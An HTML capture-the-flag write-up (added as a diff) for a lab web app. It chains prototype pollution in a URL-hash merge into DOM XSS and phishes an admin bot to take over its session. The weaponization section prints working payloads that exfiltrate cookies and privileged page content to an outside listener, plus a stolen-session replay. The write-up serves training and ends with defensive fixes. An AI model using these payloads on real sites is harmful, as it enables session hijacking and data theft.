@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>HackSmarter Polution (Easy) — Prototype pollution to admin</title>
+<style>
+  :root {
+    --bg: #0b111b; --panel: #121a27; --text: #e6eef7; --muted: #9fb0c3;
+    --accent: #ef3257; --good: #5ddea8; --code: #1a2433; --border: #243246;
+  }
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    font-family: "Segoe UI", system-ui, -apple-system, sans-serif;
+    background: var(--bg); color: var(--text); line-height: 1.65; font-size: 16px;
+  }
+  .wrap { max-width: 920px; margin: 0 auto; padding: 48px 24px 96px; }
+  h1 { font-size: 1.85rem; margin: 0 0 0.4em; }
+  h2 { font-size: 1.4rem; margin-top: 2.2em; border-bottom: 1px solid var(--border); padding-bottom: 0.35em; }
+  h3 { font-size: 1.08rem; color: var(--good); margin-top: 1.6em; }
+  .muted { color: var(--muted); }
+  .hero {
+    background: linear-gradient(145deg, #152033, #0f1622 55%, #1a1020);
+    border: 1px solid var(--border); border-radius: 16px; padding: 28px; margin-bottom: 2rem;
+  }
+  .pill {
+    display: inline-block; background: rgba(239,50,87,0.15); color: #ff7a95;
+    border: 1px solid rgba(239,50,87,0.4); border-radius: 999px;
+    padding: 0.2em 0.75em; font-size: 0.8rem; font-weight: 600; letter-spacing: 0.03em;
+    text-transform: uppercase;
+  }
+  table.meta { width: 100%; border-collapse: collapse; margin: 1rem 0; }
+  table.meta td { padding: 0.35em 0.5em; border-bottom: 1px solid var(--border); vertical-align: top; }
+  table.meta td:first-child { color: var(--muted); width: 28%; }
+  pre {
+    background: var(--code); border: 1px solid var(--border); border-radius: 10px;
+    padding: 14px 16px; overflow-x: auto; font-size: 0.82rem; line-height: 1.5;
+  }
+  code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; color: #c9e4ff; }
+  figure {
+    margin: 1.5rem 0; background: var(--panel); border: 1px solid var(--border);
+    border-radius: 12px; padding: 10px; overflow: hidden;
+  }
+  figure img { max-width: 100%; height: auto; display: block; border-radius: 8px; }
+  figcaption { color: var(--muted); font-size: 0.88rem; margin-top: 0.6rem; padding: 0 4px; }
+  .flag {
+    background: #0e1f18; border: 1px solid rgba(93,222,168,0.45); color: var(--good);
+    font-family: ui-monospace, Menlo, Consolas, monospace; padding: 14px 16px;
+    border-radius: 10px; overflow-x: auto; margin: 1rem 0;
+  }
+  .why {
+    background: rgba(59,130,246,0.08); border-left: 3px solid #3b82f6;
+    padding: 0.75rem 1rem; margin: 0.75rem 0 1rem; border-radius: 0 8px 8px 0;
+  }
+  ul { padding-left: 1.2rem; }
+  a { color: #7cb8ff; }
+  footer { margin-top: 3rem; color: var(--muted); font-size: 0.9rem; }
+  .snip-label { font-size: 0.78rem; color: var(--muted); text-transform: uppercase; letter-spacing: 0.06em; margin: 1rem 0 0.35rem; }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+<div class="hero">
+  <span class="pill">HackSmarter · Web · Easy</span>
+  <h1>Polution: prototype pollution → XSS → admin flag</h1>
+  <p class="muted">Authorized lab write-up. Lab author: Tyler Ramsbey (typo intentional). Solved 2026-08-07. Proxy evidence via <strong>gori</strong>.</p>
+</div>
+
+<table class="meta">
+  <tr><td>Challenge</td><td>Polution</td></tr>
+  <tr><td>Platform</td><td>HackSmarter (DEFCON free access)</td></tr>
+  <tr><td>Category</td><td>Client-side prototype pollution · DOM XSS · session theft</td></tr>
+  <tr><td>Target (lab)</td><td><code>10.0.31.37:3000</code> · Node.js Express</td></tr>
+  <tr><td>Start creds</td><td><code>pentester:HackSmarter123</code></td></tr>
+  <tr><td>Outcome</td><td>Administrator session + incident-response flag</td></tr>
+  <tr><td>Proxy</td><td>gori 0.2.0 · project <code>polution</code> · <code>127.0.0.1:8070</code></td></tr>
+</table>
+
+<h2>Pre-req knowledge</h2>
+<ul>
+  <li>JavaScript prototypes and <code>__proto__</code></li>
+  <li>DOM XSS sinks (HTML injection / <code>createContextualFragment</code>)</li>
+  <li>Cookie-based sessions; OOB listeners for cookie stealers</li>
+  <li>Intercepting proxies (gori / Burp) for request evidence</li>
+</ul>
+
+<h2>Core concept</h2>
+<p>
+  The dashboard merges the URL <strong>hash</strong> into a plain object without blocking dangerous keys.
+  Setting <code>#__proto__.renderCallback=…</code> pollutes <code>Object.prototype</code>, so every object
+  appears to have <code>renderCallback</code>. The app then parses that string as HTML → XSS.
+  Mail the polluted link to admin; steal cookies; open the admin-only page.
+</p>
+
+<h2>1. Recon</h2>
+<pre><code>nmap -sV -sC -p- --min-rate 1000 -T4 10.0.31.37
+# 22/tcp  OpenSSH
+# 3000/tcp Node.js Express — Hacksmarter | Login</code></pre>
+
+<figure>
+  <img src="images/01-login.png" alt="Login page" />
+  <figcaption>Figure 1 — Internal portal login at <code>http://10.0.31.37:3000/</code>.</figcaption>
+</figure>
+
+<p class="snip-label">gori flow #2 — login (snippet)</p>
+<pre><code>POST /login HTTP/1.1
+Host: 10.0.31.37:3000
+Content-Type: application/x-www-form-urlencoded
+
+username=pentester&amp;password=HackSmarter123
+
+HTTP/1.1 302 Found
+Set-Cookie: user=pentester; Path=/
+Location: /dashboard</code></pre>
+<p class="muted">Full export: <a href="requests/gori-flow-2.txt"><code>requests/gori-flow-2.txt</code></a></p>
+
+<figure>
+  <img src="images/02-dashboard-pentester.png" alt="Dashboard as pentester" />
+  <figcaption>Figure 2 — Dashboard as <code>pentester</code> (Audit Logs + Webmail + Incident Response link).</figcaption>
+</figure>
+
+<figure>
+  <img src="images/04-incident-response-403.png" alt="403 on incident response" />
+  <figcaption>Figure 3 — <code>GET /incident-response</code> → 403 for low-privilege user.</figcaption>
+</figure>
+
+<h2>2. gori capture (requests)</h2>
+<p>
+  Traffic was replayed through <code>gori run capture --project polution --port 8070</code>.
+  History list (newest first):
+</p>
+<pre><code>#7  GET  /incident-response  → 200   (admin cookies)
+#6  GET  /incident-response  → 403   (pentester)
+#5  POST /api/mail/send      → 200
+#4  GET  /api/mail           → 200
+#3  GET  /dashboard          → 200
+#2  POST /login              → 302
+#1  GET  /                   → 200</code></pre>
+
+<figure>
+  <img src="images/08-gori-history.png" alt="gori history export visualization" />
+  <figcaption>Figure 4 — gori project <code>polution</code>: history list + selected request/response dumps.</figcaption>
+</figure>
+
+<p class="snip-label">gori flow #5 — webmail send</p>
+<pre><code>POST /api/mail/send HTTP/1.1
+Cookie: user=pentester
+Content-Type: application/json
+
+{"to":"admin@hacksmarter.local","subject":"gori demo","body":"proxy capture test"}
+
+HTTP/1.1 200 OK
+{"status":"Sent"}</code></pre>
+<p class="muted"><a href="requests/gori-flow-5.txt">gori-flow-5.txt</a> · <a href="requests/gori-history.txt">gori-history.txt</a></p>
+
+<figure>
+  <img src="images/03-webmail.png" alt="Webmail tab" />
+  <figcaption>Figure 5 — Internal messenger (to: <code>admin@hacksmarter.local</code>).</figcaption>
+</figure>
+
+<h2>3. Finding the pollution sink</h2>
+<p>Inline dashboard JS (abridged):</p>
+<pre><code>function syncState(params, target) {
+  params.split('&amp;').forEach(pair =&gt; {
+    const [key, value] = /* split on first = */;
+    const path = key.split('.');
+    let current = target;
+    for (let i = 0; i &lt; path.length; i++) {
+      const part = decodeURIComponent(path[i]);
+      if (i === path.length - 1) current[part] = decodeURIComponent(value);
+      else { current[part] = current[part] || {}; current = current[part]; }
+    }
+  });
+}
+
+function executeSearch() {
+  let options = { prefix: "Searching: " };
+  if (window.location.hash) syncState(window.location.hash.substring(1), options);
+  if (options.renderCallback) {
+    const frag = document.createRange().createContextualFragment(options.renderCallback);
+    results.appendChild(frag);  // HTML sink
+  }
+}</code></pre>
+<div class="why">
+  <strong>Why this is broken:</strong> assigning <code>current['__proto__']</code> walks onto
+  <code>Object.prototype</code>. Later, <code>options.renderCallback</code> resolves via the prototype
+  chain even though <code>options</code> never set own property <code>renderCallback</code>.
+</div>
+
+<figure>
+  <img src="images/07-prototype-pollution-xss.png" alt="Prototype pollution XSS demo" />
+  <figcaption>Figure 6 — Self-test: hash PP makes <code>renderCallback</code> HTML run in the results pane.</figcaption>
+</figure>
+
+<h2>4. Weaponize via webmail</h2>
+<p>Listener on VPN IP <code>10.200.78.90:8888</code>, then mail the admin:</p>
+<pre><code># Cookie stealer (via img onerror → GET)
+http://10.0.31.37:3000/dashboard#__proto__.renderCallback=&lt;img src=x onerror="this.src='http://10.200.78.90:8888/cookie?c='+encodeURIComponent(document.cookie)"&gt;
+
+# Direct IR exfil (same-origin fetch as admin browser)
+#__proto__.renderCallback=&lt;img src=x onerror="fetch('/incident-response').then(r=&gt;r.text()).then(d=&gt;fetch('http://10.200.78.90:8888/IR_LEAK',{method:'POST',mode:'no-cors',body:d}))"&gt;</code></pre>
+
+<p class="snip-label">Exploit mail body (saved request)</p>
+<pre><code>POST /api/mail/send HTTP/1.1
+Content-Type: application/json
+Cookie: user=pentester
+
+{"to":"admin@hacksmarter.local","subject":"Audit review needed",
+ "body":"Please review … dashboard#__proto__.renderCallback=&lt;img …&gt;"}</code></pre>
+<p class="muted"><a href="requests/02-mail-send-cookie-steal.http">02-mail-send-cookie-steal.http</a> ·
+<a href="requests/03-mail-send-ir-leak.http">03-mail-send-ir-leak.http</a></p>
+
+<p>Admin bot (HeadlessChrome) called back within seconds:</p>
+<pre><code>GET /cookie?c=session%3DHS_ADMIN_7721_SECURE_AUTH_TOKEN%3B%20user%3Dadmin
+POST /IR_LEAK
+body: &lt;h1&gt;Flag: HACKSMARTER{prowling_the_prototype}&lt;/h1&gt;</code></pre>
+
+<h2>5. Admin access + flag</h2>
+<pre><code>curl -b 'user=admin; session=HS_ADMIN_7721_SECURE_AUTH_TOKEN' \
+  http://10.0.31.37:3000/incident-response</code></pre>
+
+<p class="snip-label">gori flow #7 — IR as admin</p>
+<pre><code>GET /incident-response HTTP/1.1
+Cookie: user=admin; session=HS_ADMIN_7721_SECURE_AUTH_TOKEN
+
+HTTP/1.1 200 OK
+&lt;h1&gt;Flag: HACKSMARTER{prowling_the_prototype}&lt;/h1&gt;</code></pre>
+<p class="muted"><a href="requests/gori-flow-7.txt">gori-flow-7.txt</a> · contrast 403:
+<a href="requests/gori-flow-6.txt">gori-flow-6.txt</a></p>
+
+<figure>
+  <img src="images/05-dashboard-admin.png" alt="Dashboard as admin" />
+  <figcaption>Figure 7 — Dashboard showing User: <code>admin</code> after cookie import.</figcaption>
+</figure>
+
+<figure>
+  <img src="images/06-incident-response-flag.png" alt="Flag page" />
+  <figcaption>Figure 8 — Incident Response page with flag.</figcaption>
+</figure>
+
+<div class="flag">HACKSMARTER{prowling_the_prototype}</div>
+
+<h2>Beyond Root</h2>
+<h3>Exploit path depth</h3>
+<ul>
+  <li>Client-side PP (hash merge) → DOM XSS gadget → phishing admin bot → session theft.</li>
+  <li>Alternate chain: admin browser fetches privileged HTML and POSTs it OOB (no cookie needed if HttpOnly).</li>
+</ul>
+<h3>Blue team</h3>
+<ul>
+  <li>Reject keys <code>__proto__</code>, <code>constructor</code>, <code>prototype</code> in any recursive merge.</li>
+  <li>Never feed attacker-controlled strings into <code>createContextualFragment</code> / <code>innerHTML</code>.</li>
+  <li><code>HttpOnly</code> + <code>Secure</code> + <code>SameSite</code> session cookies; CSP without <code>unsafe-inline</code>.</li>
+  <li>Sanitize or text-only internal mail; rate-limit messenger.</li>
+</ul>
+
+<footer>
+  Authorized HackSmarter lab only · gori request dumps included · mccleod1290.github.io · 2026-08-07
+</footer>
+
+</div>
+</body>
+</html>
